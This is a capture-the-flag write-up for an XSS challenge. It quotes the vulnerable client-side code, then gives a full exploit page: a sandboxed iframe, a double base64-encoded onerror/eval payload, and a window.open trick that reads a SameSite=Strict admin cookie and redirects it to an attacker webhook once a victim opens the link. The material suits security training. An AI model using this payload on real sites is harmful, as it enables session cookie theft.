# Writeup
Observation on the application:
- Flag is stored in admin cookie.
- Flag cookie is set to SameSite=Strict that means we can't access it from another domain, even from an iframe.
- The application is vulnerable to XSS in this code:
```js
    ...snip...
    function createWaifuCardHTML(file, buttonText, buttonAction) {
        const sanitizedFile = DOMPurify.sanitize(file);
        const imgHTML = `<img src="${sanitizedFile}" class="card-img-top">`;
        const buttonHTML = `<button class="btn btn-outline-light" onclick="${buttonAction}('${sanitizedFile}')">${buttonText}</button>`;
        return `<div class="card text-center waifu-item">${imgHTML}<div class="btn-container">${buttonHTML}</div></div>`;
    }
    ...snip...
```
- But we can't directly exploit it because there's some restriction here:
```js
    function displayClaimedWaifus(paths) {
        if (REGEX_SAVE_PROPS.test(initialHash)) {
            throwAlert("Invalid characters detected in the hash. Please try again.");
        }
        ...snip...
    }
    ...snip...
```

```js
    ...snip...
    function throwAlert(message) {
        document.location.hash = "";
        alert(message);
        document.location = document.referrer;
    }
    ...snip...
```
Here the step to get xss and steal the flag

1. Create a page that contains the following code:
```html
<body></body>
<script>
    const TARGET = "http://proxy"
    const i1 = document.createElement('iframe')
    function waifuDomainScript() {
        /**
            I use window.open to open a new window, this will make the browser create new window context that
            have cookies with SameSite=Strict.
        */
        const w = window.open("/")
        w.onload = () => {
            window.location = webhook + "?" + w.document.cookie
        }
    }

    let payload = btoa(`webhook='${location.origin}';(${waifuDomainScript})()`)
    payload = btoa(`" onerror="eval(atob('${payload}'))" x="`)
    i1.src = TARGET + '#' + payload
    /**
        Create a sandboxed iframe to prevent alert from being triggered.

        We only need to allow scripts, same origin, and popups, you can check the doc here:
        https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe#sandbox

        Because the iframe have recursion prevention system that stated here:
        https://www.w3.org/TR/WD-frames-970331#Infinite%20Recursion
        the frame will eventually stop the recursion redirect through the document.referrer and execute our payload.

        There is other way to bypass this, but this is the shortest way to do it.
        As example you can use csp to prevent the frame from redirecting to document.referrer.
    */
    i1.sandbox = 'allow-scripts allow-same-origin allow-popups'
    document.body.appendChild(i1)
</script>
```

2. Serve the page using a web server, make sure the server is accessible from the internet.
3. Send the link to the victim.
4. Wait for the victim to open the link.
5. The flag will be sent to the webhook.

## Read more
- https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#samesitesamesite-value
- https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe#sandbox
- https://www.w3.org/TR/WD-frames-970331#Infinite%20Recursion
